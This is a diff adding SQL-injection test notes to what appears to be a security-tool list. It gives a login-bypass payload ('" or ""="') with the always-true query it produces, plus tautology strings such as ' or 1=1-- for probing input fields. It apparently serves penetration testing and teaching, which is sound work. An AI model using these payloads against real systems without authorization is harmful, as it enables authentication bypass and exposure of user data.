@@ -37,3 +37,36 @@ Blind-Sql-Bitshifting — Blind SQL-Injection via Bitshifting
 Leviathan — Wide Range Mass Audit Toolkit
 Blisqy — Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)
 ```
+
+
+# Test: 
+## Any Field
+```
+'
+"
+```
+
+
+## Login
+Username: 
+```
+" or ""="
+```
+Password:
+```
+" or ""="
+```
+Result:
+```
+SELECT * FROM Users WHERE Name ="" or ""="" AND Pass ="" or ""=""
+```
+The SQL above is valid and will return all rows from the "Users" table, since OR ""="" is always TRUE.
+
+
+
+## Other tests
+```
+' or 1=1--
+' and 1=1--
+105 OR 1=1
+```
